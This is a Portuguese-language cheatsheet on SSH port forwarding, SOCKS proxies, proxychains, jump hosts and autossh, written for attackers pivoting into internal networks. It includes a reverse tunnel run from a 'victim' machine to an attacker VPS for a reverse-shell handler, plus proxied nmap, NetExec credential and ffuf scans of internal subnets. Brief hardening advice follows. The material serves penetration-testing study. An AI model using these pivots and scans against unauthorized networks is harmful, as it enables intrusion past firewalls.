<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 Túnel SSH e Proxychains - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ███████╗███████╗██╗  ██╗    ████████╗██╗   ██╗███╗   ██╗███╗   ██╗███████╗██╗     
  ██╔════╝██╔════╝██║  ██║    ╚══██╔══╝██║   ██║████╗  ██║████╗  ██║██╔════╝██║     
  ███████╗███████╗███████║       ██║   ██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
  ╚════██║╚════██║██╔══██║       ██║   ██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
  ███████║███████║██║  ██║       ██║   ╚██████╔╝██║ ╚████║██║ ╚████║███████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
       Pivoting, Port Forwarding (-L, -R, -D) & Proxychains Integration
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/SSH-Tunneling_&_Pivoting-blue?style=for-the-badge" alt="Túnel SSH">
  <img src="https://img.shields.io/badge/Category-Pivoting_&_Tunnels-green?style=for-the-badge" alt="Pivoting">
  <img src="https://img.shields.io/badge/Integration-Proxychains--ng-orange?style=for-the-badge" alt="Proxychains">
  <img src="https://img.shields.io/badge/Protocol-SSH_SOCKS5-purple?style=for-the-badge" alt="SOCKS5">
</p>

<p alinhar="centro">
  <b>🚇 Referência abrangente para túneis SSH locais (-L), remotos/reversos (-R) e SOCKS dinâmicos (-D) com integração Proxychains-ng</b>
</p>

---

## 📋 Índice

- [Visão geral e arquiteturas de túnel](#-overview--tunneling-architectures)
- [Encaminhamento de porta local (`-L`)](#-local-port-forwarding--l)
  - [Sintaxe e Mecânica](#sintaxe--mecânica)
  - [Encaminhando uma interface web interna](#forwarding-an-internal-web-interface)
  - [Encaminhando portas de banco de dados remoto](#forwarding-remote-database-ports)
- [Encaminhamento de porta remoto/reverso (`-R`)](#-remote--reverse-port-forwarding--r)
  - [Sintaxe e Mecânica](#sintaxe--mecânica-1)
  - [Expondo o manipulador de shell reverso local](#exposing-local-reverse-shell-handler)
  - [Retransmitindo tráfego de entrada da DMZ](#relaying-inbound-traffic-from-dmz)
- [Encaminhamento dinâmico de SOCKS (`-D`)](#-dynamic-socks-forwarding--d)
  - [Configuração de sintaxe e SOCKS5](#syntax--socks5-setup)
- [Configuração de Proxychains-ng](#-proxychains-ng-configuration)
  - [Configurando `/etc/proxychains4.conf`](#configurando-etcproxychains4conf)
  - [Roteamento de ferramentas CLI por meio de Proxychains](#routing-cli-tools-through-proxychains)
- [Pivotação multi-hop e hosts de salto (`-J`)](#-multi-hop-pivoting--jump-hosts--j)
- [Túneis persistentes com Autossh](#-túneis-persistentes-com-autossh)
- [Sequências de escape SSH interativas (`~C`)](#-interactive-ssh-escape-sequences-c)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações defensivas e OPSEC](#-considerações defensivas--opsec)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e arquiteturas de encapsulamento

O SSH não é apenas um cliente de terminal remoto; é uma camada de transporte de fluxo de bytes bidirecional e criptografada que contorna políticas restritivas de firewall de saída/entrada:

1. **Encaminhamento de porta local (`-L`):** Abre uma porta de escuta na **máquina local do invasor**; as conexões são encapsuladas por meio de SSH e encaminhadas para um destino acessível a partir do servidor SSH remoto.
2. **Encaminhamento de porta remota (`-R`):** Abre uma porta de escuta no **servidor SSH remoto**; as conexões de entrada são encapsuladas de volta à máquina local ou ao alvo interno do invasor.
3. **Encaminhamento de porta dinâmico (`-D`):** Transforma o cliente SSH em um proxy **SOCKS4/SOCKS5** local, permitindo que ferramentas (Nmap, Burp Suite, Ffuf, Metasploit) roteem tráfego TCP arbitrário pela rede remota.
```
Attacker [Kali]                  SSH Bastion / Pivot               Internal Target
 192.168.1.50   =========>       10.10.10.200 (Dual NIC)  ------>  172.16.0.15:80
   (Local)                       (SSH Server)                      (Isolated Host)
```
---

## 🔌 Encaminhamento de porta local (`-L`)

### Sintaxe e mecânica
```
ssh -L [bind_address:]<local_port>:<destination_host>:<destination_port> user@bastion
```
### Encaminhando uma interface web interna
Acesse um painel de administração web no `172.16.0.15:80` através do pivot `10.10.10.200`:
```bash
ssh -N -L 8080:172.16.0.15:80 user@10.10.10.200
```
*Agora navegue até `http://127.0.0.1:8080` em seu navegador local.*

### Encaminhando portas de banco de dados remoto
Acesse um banco de dados PostgreSQL interno vinculado apenas ao `127.0.0.1:5432` no servidor remoto:
```bash
ssh -N -L 5432:127.0.0.1:5432 ubuntu@target-server.com
```
> [!NOTA]
> Bandeiras utilizadas:
> - `-N`: Não execute um comando shell remoto (somente túnel).
> - `-f`: Executado em segundo plano imediatamente antes da execução do comando.

---

## 🔄 Encaminhamento de porta remoto/reverso (`-R`)

### Sintaxe e mecânica
```
ssh -R [bind_address:]<remote_port>:<local_host>:<local_port> user@attacker_vps
```
### Expondo o manipulador de shell reverso local
A partir de uma máquina alvo comprometida por trás do NAT, percorra firewalls de saída para enviar tráfego para seu ouvinte externo no VPS:
```bash
# Executed on victim / pivot machine
ssh -N -R 4444:127.0.0.1:4444 attacker@vps.domain.com
```
### Retransmitindo o tráfego de entrada da DMZ
Encaminhe a porta 8080 no pivô remoto para a porta local 80:
```bash
ssh -N -R 8080:127.0.0.1:80 user@pivot.corp.local
```
> [!IMPORTANTE]
> Para vincular portas remotas a todas as interfaces (`0.0.0.0`), o `/etc/ssh/sshd_config` do servidor SSH deve definir:
> `GatewayPorts yes` ou `GatewayPorts clientspecified`.

---

## 🌐 Encaminhamento dinâmico de SOCKS (`-D`)

### Sintaxe e configuração do SOCKS5
Crie um proxy SOCKS5 dinâmico na porta local `1080`:
```bash
ssh -N -D 127.0.0.1:1080 user@pivot.corp.local
```
Verifique se o proxy SOCKS está escutando:
```bash
ss -tlpn | grep 1080
```
---

## ⚙️ Configuração de proxychains-ng

Proxychains intercepta chamadas de rede de biblioteca dinâmica (`connect()`, `gethostbyname()`) via `LD_PRELOAD` para forçar aplicativos CLI padrão por meio de proxies SOCKS/HTTP.

### Configurando `/etc/proxychains4.conf`
Edite o arquivo de configuração para apontar para seu túnel SSH Dynamic SOCKS:
```ini
# Enable dynamic chain or strict chain
strict_chain

# Proxy DNS requests through proxy (prevents DNS leaks)
proxy_dns

[ProxyList]
# protocol  ip          port
socks5      127.0.0.1   1080
```
### Roteamento de ferramentas CLI por meio de Proxychains
```bash
# Nmap TCP Connect Scan (Note: SYN scans do NOT work through SOCKS proxies)
proxychains4 nmap -sT -Pn -sV 172.16.0.0/24 -p 22,80,445,3389

# Executing CrackMapExec / NetExec across internal subnet
proxychains4 nxc smb 172.16.0.100 -u 'Administrator' -p 'P@ssw0rd'

# Web fuzzing internal server
proxychains4 ffuf -u http://172.16.0.15/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
---

## 🔀 Hosts de salto e rotação multi-hop (`-J`)

Ao atravessar vários limites de firewall segmentados:
```bash
# Jump through Bastion 1, then Bastion 2, to reach Target
ssh -J user@bastion1.corp.com:22,user@bastion2.corp.internal target-user@internal-db.corp.internal

# Dynamic SOCKS over double jump
ssh -J user@bastion1:22,user@bastion2:22 -D 1080 target-user@pivot
```
---

## 🔁 Túneis persistentes com Autossh

Quando os túneis SSH caem devido ao tempo limite da rede ou ao NAT, o `autossh` monitora e reinicia automaticamente a conexão SSH:
```bash
# Install autossh
sudo apt install -y autossh

# Establish background auto-reconnecting SOCKS tunnel
autossh -M 0 -f -N -D 127.0.0.1:1080 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" user@pivot.corp.local
```
---

## ⌨️ Sequências de escape SSH interativas (`~C`)

Se você já tem uma sessão SSH interativa aberta e de repente precisa abrir um encaminhamento de porta sem desconectar:

1. Pressione `Enter`
2. Digite `~C` (Til seguido de C maiúsculo)
3. O prompt muda para `ssh> `
4. Adicione suas regras de encaminhamento instantaneamente:
   ```text
   ssh> -L 8080:192.168.10.50:80
   Forwarding port.
   ```
Ou crie SOCKS dinâmicos:
   ```text
   ssh> -D 1080
   ```
---

## ⚡ Tabela de referência rápida

| Objetivo | Comando |
|-----------|---------|
| **Encaminhamento de porta local** | `ssh -N -L <L_PORT>:<DEST_IP>:<DEST_PORT> user@pivot` |
| **Encaminhamento de porta remota** | `ssh -N -R <R_PORT>:<DEST_IP>:<DEST_PORT> user@vps` |
| **Proxy SOCKS5 dinâmico**| `ssh -N -D 127.0.0.1:1080 user@pivot` |
| **Túnel silencioso de fundo** | `ssh -f -N -D 1080 user@pivot` |
| **Pivot de host de salto** | `ssh -J user@hop1,user@hop2 target` |
| **Executar ferramenta via Proxychains** | `proxychains4 <TOOL> <ARGS>` |
| **Reconexão automática persistente** | `autossh -M 0 -f -N -D 1080 -o "ServerAliveInterval 30" user@pivot` |
| **Túnel instantâneo** | `Enter` então `~C` -> `ssh> -D 1080` |

---

## 🛡️ Considerações defensivas e OPSEC

1. **Desative o encaminhamento de porta em SSHD:** Defina `AllowTcpForwarding no` e `PermitTunnel no` em `/etc/ssh/sshd_config` em sistemas de produção reforçados.
2. **Detecção de anomalias no fluxo de rede:** Sessões SSH persistentes e de longa duração que transferem fluxos substanciais de bytes bidirecionais geralmente indicam tunelamento interativo ou exfiltração de dados.

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> O tunelamento SSH e a articulação da rede só devem ser executados em redes e sistemas onde tenha sido obtida autorização explícita por escrito. O desvio não autorizado de firewalls de rede perimetral é ilegal.